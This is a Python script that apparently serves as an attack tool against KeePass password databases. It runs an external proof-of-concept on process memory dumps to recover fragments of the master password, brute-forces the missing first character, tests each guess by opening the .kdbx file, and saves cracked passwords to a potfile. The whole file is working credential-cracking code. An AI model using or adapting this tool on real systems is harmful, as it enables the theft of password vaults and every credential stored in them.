import argparse
import os
from subprocess import run, CalledProcessError
from typing import List
from pykeepass import PyKeePass
from collections.abc import Iterator

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:',.<>?`~"

def run_poc(dmp_file: str)-> List[str]:
    command = ['python', 'keypass-dump-masterkey/poc.py', dmp_file]
    try:
        passwords = run(command, capture_output=True, text=True, check=True).stdout.splitlines()
        return passwords
    except CalledProcessError as e:
        print(f"An error occured with running the poc file: {e}")
        print(e.stderr)
        return []

def get_passwords_with_charset(first_char:str, password: str)-> Iterator[str]:
    password = first_char + password
    print('Generated password with charset is: ' +  password)
    # Yield for saving the state and iterating over the function instead of stoping the iteration with 'return'
    yield password

def login_test(kdbx_file:str, password:str)->bool:
    try:
        PyKeePass(kdbx_file, password=password)
        print(f"Login was successful with this password: {password}\n")
        return True
    except Exception as e:
        print(f"An unexpected error occurred: {e}\n")
        return False
    
def main():
    parser = argparse.ArgumentParser(description="Exploit dmp/kdbx files with poc.py")
    parser.add_argument("-dir", required=True, help="Directory with 'kdbx' and 'DMP' files")
    args = parser.parse_args()
    path_to_directory=args.dir

    try:
        kdbx_files = [f for f in os.listdir(path_to_directory) if f.endswith('.kdbx')]
        dmp_files = [f for f in os.listdir(path_to_directory) if f.endswith('.DMP')]
        
        passwords = []
        for kdbx_file in kdbx_files:
            equal_dmp = kdbx_file.replace('.kdbx', '.DMP')
            if equal_dmp in dmp_files:
                dmp_file_path = f'./files/{equal_dmp}'
                kdbx_file__path = os.path.join(path_to_directory, kdbx_file)
                
                password_parts = run_poc(dmp_file_path)
                print('List of strings is: ', password_parts)
                password_found = False

                for password in password_parts:
                    print('current pw is:' + password)
                    if password_found:
                        break 
                    for first_char in charset:
                        if password_found:
                            break 

                        try_passwords = get_passwords_with_charset(first_char, password)

                        for complete_password in try_passwords:
                            if login_test(kdbx_file__path, complete_password):
                                password_found = True
                                passwords.append(f"{kdbx_file} : {complete_password}")
                                break
        if len(passwords) > 0: 
            potfile = os.path.join(path_to_directory, '.potfile')
            with open(potfile, 'w', encoding='utf-8') as f:
                for password_pair in passwords:
                    f.write(f"{password_pair}\n")
                print('Pushed passwords to potfile')
        else:
            print('There is no correct password')
    except FileNotFoundError:
        print('File not found')

if __name__ == "__main__":
    main()